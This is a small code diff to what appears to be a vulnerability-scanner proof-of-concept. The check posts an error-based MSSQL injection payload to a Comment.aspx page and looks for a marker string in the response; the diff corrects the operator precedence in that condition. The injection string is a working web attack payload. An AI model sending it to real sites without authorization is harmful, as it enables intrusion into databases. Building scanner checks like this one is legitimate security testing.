@@ -51,7 +51,7 @@ class Poc(ABPoc):
             post = '/author1=3&isGuest=true&content1=3&bname=111&pagenum=1&qnum=96&pname=%27%20and%20(db_name()%2BCHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(88)%2BCHAR(81)%2BCHAR(49)%2BCHAR(55))>0--&newsid=3&isnews=false'
             target = arg+'/Comment.aspx'
             code, head, res, errcode, _ = hh.http(target, post=post)
-            if code == 200 or code == 500 and 'testXQ17' in res:
+            if (code == 200 or code == 500) and 'testXQ17' in res:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
